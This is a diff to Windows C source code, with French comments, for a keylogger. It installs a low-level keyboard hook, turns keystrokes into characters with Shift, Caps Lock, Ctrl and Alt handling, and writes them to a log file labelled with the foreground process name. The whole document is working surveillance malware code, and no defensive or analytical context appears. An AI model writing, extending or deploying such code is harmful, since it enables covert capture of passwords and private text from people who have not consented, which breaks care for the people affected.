@@ -53,45 +53,71 @@ int main(void)
 }
 
 // Fonction de hook pour capturer les frappes
-static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
-{
-    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
+static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
+        char key[32] = { 0 };
 
-        // Obtenir la fenêtre et le processus en premier plan
-        HWND foregroundWindow = GetForegroundWindow();
-        DWORD processId;
-        GetWindowThreadProcessId(foregroundWindow, &processId);
+        // Récupérer l'état du clavier
+        BYTE keyboardState[256];
+        GetKeyboardState(keyboardState);
 
-        if (foregroundWindow != g_last_window) {
-            // La fenêtre a changé, mettre à jour le processus et la fenêtre enregistrés
-            g_last_window = foregroundWindow;
+        // Vérifier l'état de Shift et de Caps Lock
+        BOOL isShiftPressed = GetKeyState(VK_SHIFT) & 0x8000;
+        BOOL isCapsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;
 
-            HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
-            if (processHandle) {
-                char process_name[MAX_PATH] = "<Unknown>";
-                GetModuleFileNameEx(processHandle, NULL, process_name, MAX_PATH);
-                strcpy(process_name, PathFindFileName(process_name));
-                CloseHandle(processHandle);
+        // Ignorer les touches Shift, Ctrl, Alt, et Caps Lock pour éviter qu'elles soient loggées sous forme de code
+        /*if (pKeyboard->vkCode == VK_SHIFT || pKeyboard->vkCode == VK_LSHIFT || pKeyboard->vkCode == VK_RSHIFT ||
+            pKeyboard->vkCode == VK_CONTROL || pKeyboard->vkCode == VK_LCONTROL || pKeyboard->vkCode == VK_RCONTROL ||
+            pKeyboard->vkCode == VK_MENU || pKeyboard->vkCode == VK_LMENU || pKeyboard->vkCode == VK_RMENU ||
+            pKeyboard->vkCode == VK_CAPITAL) {
+            return CallNextHookEx(g_hook, nCode, wParam, lParam);
+        }*/
 
-                // Log the new process and window
-                if (strcmp(g_last_process, process_name) != 0) {
-                    strcpy(g_last_process, process_name);
-                }
-                log_new_window(process_name);
+        // Ignorer les touches non imprimables
+        if (pKeyboard->vkCode < 0x20 || pKeyboard->vkCode > 0x7E) {
+            // Inclure des exceptions pour les touches que vous voulez loguer
+            if (pKeyboard->vkCode != VK_RETURN && pKeyboard->vkCode != VK_SPACE &&
+                pKeyboard->vkCode != VK_TAB && pKeyboard->vkCode != VK_BACK) {
+                return CallNextHookEx(g_hook, nCode, wParam, lParam);
             }
         }
 
-        // Conversion de la touche en caractère selon la locale courante
-        char key[32] = { 0 };
-        BYTE keyboardState[256];
-        GetKeyboardState(keyboardState);
-        WORD ascii;
-        if (ToAscii(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, &ascii, 0) == 1) {
-            sprintf(key, "%c", ascii);
+        switch (pKeyboard->vkCode) {
+        case VK_TAB:
+            strcpy(key, "[Tab]");
+            break;
+        case VK_RETURN:
+            strcpy(key, "[Enter]");
+            break;
+        case VK_BACK:
+            strcpy(key, "[Backspace]");
+            break;
+        default:
+            // Conversion de la touche en fonction de l'état actuel du clavier
+            if (ToAscii(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, (LPWORD)key, 0) == 1) {
+                if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
+                    // Convertir en majuscule
+                    key[0] = (char)toupper(key[0]);
+
+                }
+                else if (!isShiftPressed && !isCapsLockOn) {
+                    // Convertir en minuscule
+                    key[0] = (char)tolower(key[0]);
+                }
+            }
+            else {
+                sprintf(key, "[%lu]", pKeyboard->vkCode);
+            }
+            // Ajoutez d'autres touches spéciales ici
         }
-        else {
-            sprintf(key, "[%lu]", pKeyboard->vkCode);
+
+        // Gérer les combinaisons de touches (e.g., Ctrl+C)
+        if (GetKeyState(VK_CONTROL) & 0x8000) {
+            sprintf(key, "[Ctrl+%c]", key[0]);
+        }
+        if (GetKeyState(VK_MENU) & 0x8000) {  // Alt key
+            sprintf(key, "[Alt+%c]", key[0]);
         }
 
         // Écrire la touche dans le fichier log
@@ -116,6 +142,29 @@ static void log_new_window(const char* process_name)
 // Fonction pour écrire dans le fichier log
 static void write_to_log(const char* str)
 {
+    // Obtenir la fenêtre et le processus en premier plan
+    HWND foreground_window = GetForegroundWindow();
+    DWORD pid;
+    GetWindowThreadProcessId(foreground_window, &pid);
+
+    if (foreground_window != g_last_window) {
+        // La fenêtre a changé, mettre à jour le processus et la fenêtre enregistrés
+        g_last_window = foreground_window;
+
+        HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+        if (process) {
+            char process_name[MAX_PATH] = "<Unknown>";
+            GetModuleFileNameEx(process, NULL, process_name, MAX_PATH);
+            strcpy(process_name, PathFindFileName(process_name));
+            CloseHandle(process);
+
+            // Log the new process and window
+            if (strcmp(g_last_process, process_name) != 0) {
+                strcpy(g_last_process, process_name);
+            }
+            log_new_window(process_name);
+        }
+    }
     fprintf(g_logfile, "%s", str);
     fflush(g_logfile);
 }
